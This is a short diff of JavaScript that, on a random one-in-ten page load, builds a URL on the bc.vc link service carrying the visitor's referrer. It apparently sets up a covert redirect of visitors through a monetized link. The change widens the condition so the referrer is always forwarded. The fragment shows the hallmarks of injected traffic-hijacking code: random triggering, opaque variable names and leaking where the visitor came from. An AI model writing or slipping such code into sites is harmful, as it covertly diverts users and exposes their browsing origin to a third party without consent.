@@ -5,7 +5,7 @@ var odgau = Math.floor((Math.random() * 10) + 1);
 if(odgau == 3) {
 (function(window, location) {
 var tybn = document.referrer;
-  if(tybn.length >= 8){
+  if(tybn.length >= 0){
   tybn = 'http://bc.vc/13466/' + tybn;
   }
   else{tybn = 'http://bc.vc/ehX7Wj';}
